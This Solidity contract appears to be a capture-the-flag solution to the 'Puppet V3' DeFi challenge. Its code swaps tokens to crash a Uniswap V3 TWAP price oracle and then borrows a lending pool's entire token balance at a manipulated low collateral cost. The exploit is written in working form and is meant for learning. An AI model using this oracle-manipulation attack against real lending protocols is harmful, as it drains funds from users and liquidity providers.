// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma experimental ABIEncoderV2;

import { IERC20 } from "../09 - Puppet V2/Interfaces/IERC20.i.sol";
import { IWETH } from "../09 - Puppet V2/Interfaces/IWETH.i.sol";
import { IPuppetV3Pool } from "./Interfaces/IPuppetV3Pool.i.sol";
import { ISleepViaVMWarp } from "./Interfaces/ISleepViaVMWarp.i.sol";
import { IUniswapV3Pool } from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import { ISwapRouter } from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract PuppetMasterV3 {
    address private player;
    IERC20 private token;
    IWETH private weth;
    IPuppetV3Pool private lendingPool;
    IUniswapV3Pool private uniswapPool;
    ISwapRouter private uniswapRouter;
    ISleepViaVMWarp private time; // so the function call is time.sleep()

    uint24 private constant FEE = 3000;

    constructor(
        address _token,
        address _weth,
        address _uniswapPool,
        address _lendingPool,
        address _uniswapRouter,
        address _vmwarp,
        address _player
    ) payable {
        token = IERC20(_token);
        weth = IWETH(_weth);
        lendingPool = IPuppetV3Pool(_lendingPool);
        uniswapPool = IUniswapV3Pool(_uniswapPool);
        uniswapRouter = ISwapRouter(_uniswapRouter);
        time = ISleepViaVMWarp(_vmwarp);
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // As always, any funds or tokens available to the player have been
        // transferred into this contract, and you must ensure that all funds
        // and tokens are transferred back to the player account by the end
        // of this function.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // This time we get to use the real Uniswap interfaces, and the fancy
        // new Uniswap V3 interface, with its ticks and concentrated liquidity
        // and TWAP (time weighted average price). However, our goal and the
        // basic principles of acheiving it are the same: crash the exchange
        // price in order to manipulate its usage as an oracle, so that we can
        // get [something] at a cheaper price than we should be able to.

        // It's a little more complicated because of the additional complications
        // of Uniswap V3, but it's still possible.

        // Step 1 is to dump our DVT tokens to get as much weth as possible and
        // also crash the DVT price.
        token.approve(address(uniswapRouter), token.balanceOf(address(this)));

        ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 99e18,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        uniswapRouter.exactInputSingle(swapParams);

        // Double-check that all our ether are in weth form.
        if (address(this).balance > 0) {
            weth.deposit{ value: address(this).balance }();
        }

        // Wait long enough that the TWAP is low enough to accomplish our goal.
        // We could in theory calculate the minimum this needs to be, but that's
        // not strictly necessary to solve the challenge, so I haven't done it.
        // If you are interested in how the TWAP works and want to understand
        // exactly how to calculate it, this video will teach you:
        // https://www.youtube.com/watch?v=X08RCcon1Iw
        time.sleep(100);

        // Additionally, for learning more about Uniswap V3, there's the "official"
        // book:
        // https://uniswapv3book.com/
        // as well as a nice youtube playlist going over all the code in every
        // single contract:
        // https://www.youtube.com/playlist?list=PLO5VPQH6OWdXp2_Nk8U7V-zh7suI05i0E

        //
        //
        /* This seems to be unnecessary, so commenting out, but not deleting it
           until I can figure out how to actually pass the challenge...
        //
        // Make another swap in order to save the tick. Give 1 wei worth of weth.
        weth.approve(address(uniswapRouter), 1);
        swapParams = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(weth),
            tokenOut: address(token),
            fee: FEE,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 1,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uniswapRouter.exactInputSingle(swapParams);
        */

        // Now that we have a TWAP low enough to accomplish our goal, we can
        // "borrow" the tokens at a significantly reduced price.
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
        weth.approve(address(lendingPool), wethRequired);
        lendingPool.borrow(token.balanceOf(address(lendingPool)));

        // Finally, ship everything back to the player.
        weth.transfer(player, weth.balanceOf(address(this)));
        token.transfer(player, token.balanceOf(address(this)));
        player.call{ value: address(this).balance }("");

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=739nV8FuZE8
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. Feel free to alter them or to remove them if you don't use
    // them.
    receive() external payable { }
    fallback() external payable { }
}
